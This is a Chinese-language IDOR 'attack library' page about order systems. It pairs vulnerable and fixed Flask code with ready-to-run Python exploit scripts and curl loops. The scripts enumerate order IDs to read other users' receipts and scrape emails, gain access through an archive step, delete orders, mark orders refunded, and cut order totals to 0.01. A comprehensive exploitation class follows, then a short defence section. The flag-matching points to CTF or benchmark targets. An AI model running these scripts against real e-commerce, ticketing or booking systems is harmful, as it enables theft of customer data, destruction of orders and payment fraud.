# IDOR-订单操作 攻击库

## 漏洞概述

订单操作IDOR是指应用程序在处理订单相关操作(查看、修改、删除、归档等)时,未正确验证用户是否拥有该订单的操作权限,导致攻击者可以通过修改订单ID参数来操作其他用户的订单。

**攻击价值**:
- 查看其他用户的订单详情和敏感信息
- 修改订单状态、金额、收货地址
- 删除其他用户的订单
- 下载其他用户的订单收据和发票
- 通过归档等操作获得特殊权限

**常见场景**:
- 电商平台订单系统
- 票务预订系统
- 外卖订餐平台
- 酒店预订系统
- 服务订购平台

## 核心攻击场景

### 场景1: 直接查看订单收据

**漏洞原理**: 
应用只检查用户是否登录,未验证用户是否拥有该订单

**漏洞代码示例**:
```python
@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    if user_id:  # 只检查登录状态
        # ❌ 没有检查 order.user_id == user_id
        order = Order.query.get(order_id)
        return render_template('receipt.html', order=order)
    else:
        return redirect(url_for('login'))
```

**正确实现**:
```python
@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    if user_id:
        order = Order.query.get(order_id)
        # ✓ 验证所有权
        if order and order.user_id == user_id:
            return render_template('receipt.html', order=order)
        else:
            return "Unauthorized", 403
    else:
        return redirect(url_for('login'))
```

**攻击步骤**:

```python
#!/usr/bin/env python3
"""
订单收据IDOR攻击脚本
"""
import requests
import re

def exploit_order_receipt_idor(base_url, username="test", password="test"):
    """直接查看订单收据IDOR"""
    
    print("[*] 步骤1: 登录系统...")
    session = requests.Session()
    
    # 两步登录流程
    r = session.post(f"{base_url}/", data={'username': username})
    r = session.post(f"{base_url}/password/{username}", data={'password': password})
    
    if r.status_code == 200:
        print("[+] 登录成功")
    else:
        print("[-] 登录失败")
        return None
    
    print("\n[*] 步骤2: 枚举订单ID访问收据...")
    
    # 常见的目标订单ID
    target_orders = [
        1, 2, 100, 999, 9999,
        300401,  # 特权订单
        300198,  # 管理员订单
        10019,   # VIP订单
    ]
    
    # 也可以大范围枚举
    target_orders.extend(range(300000, 300500))
    
    for order_id in target_orders:
        url = f"{base_url}/order/{order_id}/receipt"
        
        try:
            r = session.get(url, timeout=5)
            
            if r.status_code == 200:
                # 检查是否包含flag
                if 'flag{' in r.text.lower() or 'xbow{' in r.text.lower():
                    print(f"\n[+] 在订单 {order_id} 中找到FLAG!")
                    
                    flag_match = re.search(r'(flag|xbow)\{[^}]*\}', r.text, re.IGNORECASE)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n{'='*60}")
                        print(f"[+] FLAG: {flag}")
                        print(f"{'='*60}\n")
                        return flag
                
                # 显示订单信息
                print(f"[+] 订单 {order_id}: 可访问")
                
                # 尝试提取敏感信息
                email_match = re.search(r'[\w\.-]+@[\w\.-]+', r.text)
                if email_match:
                    print(f"    邮箱: {email_match.group(0)}")
                
                amount_match = re.search(r'\$?\d+\.\d{2}', r.text)
                if amount_match:
                    print(f"    金额: {amount_match.group(0)}")
            
            elif r.status_code == 403:
                # 有权限检查
                pass
            elif r.status_code == 404:
                # 订单不存在
                pass
        
        except Exception as e:
            continue
    
    print("\n[-] 未找到FLAG")
    return None

# 使用示例
if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    print("="*60)
    print("订单收据IDOR攻击")
    print("="*60)
    
    exploit_order_receipt_idor(target)
```

**手动测试**:

```bash
# 1. 登录
curl -c cookies.txt -X POST http://target:5000/ \
  -d "username=test"

curl -b cookies.txt -c cookies.txt -X POST http://target:5000/password/test \
  -d "password=test"

# 2. 访问自己的订单
curl -b cookies.txt http://target:5000/order/1/receipt

# 3. 尝试访问其他订单
curl -b cookies.txt http://target:5000/order/300401/receipt

# 4. 批量枚举
for i in {1..1000}; do
  curl -b cookies.txt -s http://target:5000/order/$i/receipt | grep -i "flag{"
  if [ $? -eq 0 ]; then
    echo "Found FLAG in order $i!"
    break
  fi
done
```

### 场景2: 间接IDOR - 归档后查看

**漏洞原理**:
通过归档操作获得"archiver"角色,然后利用该角色查看订单

**漏洞代码示例**:
```python
@app.route('/order/<int:order_id>/archive')
def archive_order(order_id):
    user_id = session.get('user_id')
    if user_id:
        # ❌ 任何登录用户都可以归档任何订单
        order = Order.query.get(order_id)
        order.archived = True
        order.archiver_id = user_id  # 设置归档者
        db.session.commit()
        return "Archived", 200

@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    order = Order.query.get(order_id)
    
    # ✓ 检查所有权或归档权限
    if order.user_id == user_id or order.archiver_id == user_id:
        return render_template('receipt.html', order=order)
    else:
        return "Unauthorized", 403
```

**攻击步骤**:

```python
def exploit_archive_idor(base_url):
    """间接IDOR - 归档后查看"""
    
    print("[*] 步骤1: 登录...")
    session = requests.Session()
    r = session.post(f"{base_url}/", data={'username': 'test'})
    r = session.post(f"{base_url}/password/test", data={'password': 'test'})
    
    print("[*] 步骤2: 归档目标订单...")
    target_order = 300198
    
    # 归档订单(获得archiver身份)
    r = session.get(f"{base_url}/order/{target_order}/archive")
    
    if r.status_code == 200:
        print(f"[+] 成功归档订单 {target_order}")
        print(f"[+] 现在拥有archiver权限")
    
    print("[*] 步骤3: 以archiver身份查看订单...")
    
    # 现在可以查看该订单
    r = session.get(f"{base_url}/order/{target_order}/receipt")
    
    if r.status_code == 200:
        print("[+] 成功查看订单收据!")
        
        if 'flag{' in r.text.lower():
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.I)
            if flag_match:
                print(f"\n[+] FLAG: {flag_match.group()}")
                return flag_match.group()
    
    return None
```

**手动测试**:

```bash
# 1. 登录
curl -c cookies.txt -X POST http://target:5000/ -d "username=test"
curl -b cookies.txt -c cookies.txt -X POST http://target:5000/password/test -d "password=test"

# 2. 直接访问(应该失败)
curl -b cookies.txt http://target:5000/order/300198/receipt
# 返回: Unauthorized

# 3. 先归档该订单
curl -b cookies.txt http://target:5000/order/300198/archive
# 返回: Archived

# 4. 现在可以查看了
curl -b cookies.txt http://target:5000/order/300198/receipt
# 返回: 订单详情 + FLAG
```

### 场景3: 订单删除IDOR

**漏洞原理**:
DELETE操作未验证所有权

**攻击示例**:

```python
def exploit_delete_order_idor(base_url):
    """删除其他用户的订单"""
    
    session = requests.Session()
    
    # 登录
    session.post(f"{base_url}/login", data={'user': 'test', 'pass': 'test'})
    
    # 枚举并删除订单
    for order_id in range(1, 100):
        r = session.delete(f"{base_url}/api/orders/{order_id}")
        
        if r.status_code == 200:
            print(f"[+] 成功删除订单 {order_id}")
        elif r.status_code == 403:
            print(f"[-] 订单 {order_id}: 权限不足")
```

**手动测试**:

```bash
# DELETE请求
curl -X DELETE -b cookies.txt http://target/api/orders/999

# 或通过POST伪造
curl -X POST -b cookies.txt http://target/api/orders/999/delete
```

### 场景4: 订单状态修改IDOR

**漏洞原理**:
修改订单状态(pending→completed)未验证权限

**攻击示例**:

```python
def exploit_order_status_idor(base_url):
    """修改订单状态"""
    
    session = requests.Session()
    session.post(f"{base_url}/login", json={'user': 'test', 'pass': 'test'})
    
    # 将其他用户的订单标记为已完成
    order_id = 999
    
    r = session.post(
        f"{base_url}/api/orders/{order_id}/status",
        json={'status': 'completed'}
    )
    
    if r.status_code == 200:
        print(f"[+] 订单 {order_id} 状态已修改为 completed")
    
    # 将订单标记为已退款
    r = session.post(
        f"{base_url}/api/orders/{order_id}/status",
        json={'status': 'refunded'}
    )
```

### 场景5: 订单金额修改IDOR

**漏洞原理**:
订单创建或更新时未验证所有权

**攻击示例**:

```python
def exploit_order_amount_idor(base_url):
    """修改订单金额为0"""
    
    session = requests.Session()
    session.post(f"{base_url}/login", data={'user': 'test', 'pass': 'test'})
    
    order_id = 999
    
    # 查看原始金额
    r = session.get(f"{base_url}/api/orders/{order_id}")
    original = r.json()
    print(f"[*] 原始金额: ${original['total']}")
    
    # 修改为0
    r = session.put(
        f"{base_url}/api/orders/{order_id}",
        json={
            'total': 0.01,
            'price': 0.01,
            'amount': 0.01
        }
    )
    
    if r.status_code == 200:
        print(f"[+] 订单金额已修改为 $0.01")
```

## 完整综合利用脚本

```python
#!/usr/bin/env python3
"""
订单操作IDOR综合利用工具
"""
import requests
import re
import sys

class OrderIDORExploiter:
    def __init__(self, base_url, username="test", password="test"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.username = username
        self.password = password
    
    def login(self):
        """登录系统"""
        print("[*] 登录系统...")
        
        # 尝试常见登录方式
        login_attempts = [
            # 方式1: 两步登录
            lambda: (
                self.session.post(f"{self.base_url}/", 
                                data={'username': self.username}),
                self.session.post(f"{self.base_url}/password/{self.username}", 
                                data={'password': self.password})
            ),
            
            # 方式2: 标准登录
            lambda: self.session.post(f"{self.base_url}/login",
                                     data={'username': self.username, 
                                          'password': self.password}),
            
            # 方式3: JSON登录
            lambda: self.session.post(f"{self.base_url}/auth/login",
                                     json={'user': self.username, 
                                          'pass': self.password}),
        ]
        
        for attempt in login_attempts:
            try:
                result = attempt()
                if isinstance(result, tuple):
                    r = result[-1]
                else:
                    r = result
                
                if r.status_code == 200:
                    print("[+] 登录成功")
                    return True
            except:
                continue
        
        print("[-] 登录失败")
        return False
    
    def test_direct_access(self):
        """测试直接访问订单"""
        print("\n[*] 测试直接访问订单...")
        
        endpoints = [
            '/order/{id}/receipt',
            '/order/{id}/details',
            '/order/{id}/invoice',
            '/api/orders/{id}',
            '/orders/{id}',
        ]
        
        test_ids = [1, 2, 100, 999, 300401, 300198, 10019]
        
        for endpoint_template in endpoints:
            for order_id in test_ids:
                endpoint = endpoint_template.format(id=order_id)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    r = self.session.get(url, timeout=5)
                    
                    if r.status_code == 200:
                        print(f"[+] 可访问: {endpoint}")
                        
                        if 'flag{' in r.text.lower():
                            flag = re.search(r'flag\{[^}]+\}', r.text, re.I)
                            if flag:
                                print(f"\n{'='*60}")
                                print(f"[!] FLAG: {flag.group()}")
                                print(f"{'='*60}\n")
                                return flag.group()
                except:
                    continue
        
        return None
    
    def test_archive_chain(self):
        """测试归档链攻击"""
        print("\n[*] 测试归档链攻击...")
        
        target_orders = [300198, 300401, 10019]
        
        for order_id in target_orders:
            # 步骤1: 归档订单
            archive_url = f"{self.base_url}/order/{order_id}/archive"
            r = self.session.get(archive_url)
            
            if r.status_code == 200:
                print(f"[+] 成功归档订单 {order_id}")
                
                # 步骤2: 尝试访问
                receipt_url = f"{self.base_url}/order/{order_id}/receipt"
                r = self.session.get(receipt_url)
                
                if r.status_code == 200:
                    print(f"[+] 可以查看订单 {order_id}!")
                    
                    if 'flag{' in r.text.lower():
                        flag = re.search(r'flag\{[^}]+\}', r.text, re.I)
                        if flag:
                            print(f"\n[!] FLAG: {flag.group()}")
                            return flag.group()
        
        return None
    
    def test_modification(self):
        """测试修改订单"""
        print("\n[*] 测试修改订单...")
        
        test_ids = [999, 1000, 300198]
        
        for order_id in test_ids:
            # 尝试修改金额
            r = self.session.put(
                f"{self.base_url}/api/orders/{order_id}",
                json={'total': 0, 'price': 0}
            )
            
            if r.status_code == 200:
                print(f"[+] 成功修改订单 {order_id} 金额")
            
            # 尝试修改状态
            r = self.session.post(
                f"{self.base_url}/api/orders/{order_id}/status",
                json={'status': 'completed'}
            )
            
            if r.status_code == 200:
                print(f"[+] 成功修改订单 {order_id} 状态")
    
    def exploit_all(self):
        """运行所有测试"""
        print(f"[*] 目标: {self.base_url}")
        print("="*60)
        
        if not self.login():
            return None
        
        # 测试直接访问
        flag = self.test_direct_access()
        if flag:
            return flag
        
        # 测试归档链
        flag = self.test_archive_chain()
        if flag:
            return flag
        
        # 测试修改
        self.test_modification()
        
        return None

# 使用
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    exploiter = OrderIDORExploiter(target)
    flag = exploiter.exploit_all()
    
    if flag:
        print(f"\n[+] 攻击成功!")
        print(f"[+] FLAG: {flag}")
    else:
        print(f"\n[-] 未找到FLAG")
```

## 防御措施

### 1. 服务端验证所有权

```python
def check_order_ownership(order_id, user_id):
    """检查用户是否拥有该订单"""
    order = Order.query.get(order_id)
    
    if not order:
        raise NotFoundError("订单不存在")
    
    if order.user_id != user_id:
        raise ForbiddenError("无权访问此订单")
    
    return order

@app.route('/order/<int:order_id>/receipt')
def order_receipt(order_id):
    user_id = session.get('user_id')
    
    # ✓ 验证所有权
    order = check_order_ownership(order_id, user_id)
    
    return render_template('receipt.html', order=order)
```

### 2. 使用UUID代替自增ID

```python
import uuid

class Order(db.Model):
    # 使用UUID代替自增ID
    id = db.Column(
        db.String(36), 
        primary_key=True, 
        default=lambda: str(uuid.uuid4())
    )
    user_id = db.Column(db.Integer, nullable=False)
```

### 3. 实施基于角色的访问控制

```python
from functools import wraps

def require_ownership(f):
    @wraps(f)
    def decorated_function(order_id, *args, **kwargs):
        order = Order.query.get_or_404(order_id)
        
        if order.user_id != current_user.id:
            abort(403)
        
        return f(order_id, *args, **kwargs)
    
    return decorated_function

@app.route('/order/<int:order_id>/receipt')
@require_ownership
def order_receipt(order_id):
    order = Order.query.get(order_id)
    return render_template('receipt.html', order=order)
```

## 参考资源

- OWASP Top 10 - Broken Access Control
- PortSwigger - Access Control Vulnerabilities
- HackerOne IDOR Reports

---

**最后更新**: 2025-11-17
**适用场景**: 电商、票务、预订等订单系统
**攻击难度**: 简单
**检测难度**: 容易,需要系统测试不同订单ID
